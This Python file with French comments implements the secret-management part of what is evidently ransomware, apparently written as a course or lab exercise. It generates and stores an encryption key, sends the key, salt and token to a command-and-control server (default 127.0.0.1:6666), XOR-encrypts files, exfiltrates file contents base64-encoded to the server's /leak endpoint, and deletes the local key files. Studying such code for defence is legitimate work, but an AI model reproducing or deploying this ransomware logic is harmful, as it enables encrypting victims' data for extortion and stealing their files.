from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        #génèration d'une clé dérivée avec PBKDF2HMAC
        
        kdf = PBKDF2HMAC( 
                algorithm=hashes.SHA256(), #renforce la sécurité
                length=self.KEY_LENGTH, #longueur de la clé finale
                salt=salt, #utilisation du sel
                iterations=self.ITERATION
        )
        return kdf.derive(key)
                

    def create(self)->Tuple[bytes, bytes, bytes]:
        salt= secrets.token_bytes(self.SALT_LENGTH) #génération  d'un sel aléatoire
        key= secrets.token_bytes(self.KEY_LENGTH) # génération d'une clé aléatoire
        token= self.do_derivation(salt, key) #utilisation du sel et de la clé pour dériver un token
        return salt, key, token

    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")
    
    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        data = {
                "token": self.bin_to_b64(token),
                "salt": self.bin_to_b64(salt),
                "key": self.bin_to_b64(key),
            }
        requests.post(f"http://{self._remote_host_port}/new", json=data) #envoi des données au cnc


    def setup(self) -> None:
        """initilisation du stockage des clés et du token"""
        os.makedirs(self._path, exist_ok=True) #crée le répertoire s'il n'existe pas 
        token_path = os.path.join(self._path, "token.bin")
        key_path = os.path.join(self._path, "key.bin")

        if os.path.exists(token_path) and os.path.exists(key_path):
            self.load() #chargement des clés existantes si elles sontr déjà là 
            return

        salt, key, token = self.create()
        self._key = key #stockage de la clé pour l'utilisér après

        with open(token_path, "wb") as f:
            f.write(token) #sauvegarde du token

        with open(key_path, "wb") as f:
            f.write(key)  #sauvegarde de la clé 

        with open(os.path.join(self._path, "salt.bin"), "wb") as f:
            f.write(salt) #sauvearde du sel

        self.post_new(salt, key, token) #envoi au serveur CNC

        self.load() #rechargement des valeurs sauvegardées

    def load(self) -> None:
        """charge les fichiers token, salt et key pour les utiliser"""
        token_path = os.path.join(self._path, "token.bin")
        salt_path = os.path.join(self._path, "salt.bin")
        key_path = os.path.join(self._path, "key.bin")

        with open(token_path, "rb") as f:
            self._token = f.read() #lecture du token

        with open(salt_path, "rb") as f:
            self._salt = f.read() #lecture du sel

        if os.path.exists(key_path):
            with open(key_path, "rb") as f:
                self._key = f.read() #lecture de la clé
        else:
            self._key = None # si la clé n'existe pas, on evite que ça plante avec cette ligne

    def check_key(self, candidate_key: bytes) -> bool:
        """vérifie si la clé coorespond au token qui a été enregistré"""
        return self.do_derivation(self._salt, candidate_key) == self._token

    def set_key(self, b64_key: str) -> None:
        """décode et stocke la clé en base64"""
        key = base64.b64decode(b64_key)
        self._key = key

    def get_hex_token(self) -> str:
        """retourne le token en hexa"""
        return sha256(self._token).hexdigest()

    def xorfiles(self, files: List[str]) -> None:
        """chiffre/déchiffre les fichiers .txt avec les clés"""
        for file in files:
            print(f"Chiffrement/Déchiffrement du fichier -> {file}")
            xorfile(file, self._key)

    def leak_files(self, files: List[str]) -> None:
        """convertit les fichiers en base64 et les envoie au serveur"""
        for file in files:
            with open(file, "rb") as f:
                encoded_data = self.bin_to_b64(f.read())

            data = {
                "token": self.bin_to_b64(self._token),
                "filename": os.path.basename(file),
                "data": encoded_data,
            }
            requests.post(f"http://{self._remote_host_port}/leak", json=data)

    def clean(self) -> None:
        """Supprime les fichiers contenant les clés"""
        os.remove(os.path.join(self._path, "token.bin"))
        os.remove(os.path.join(self._path, "salt.bin"))
        os.remove(os.path.join(self._path, "key.bin")) #supprime la clé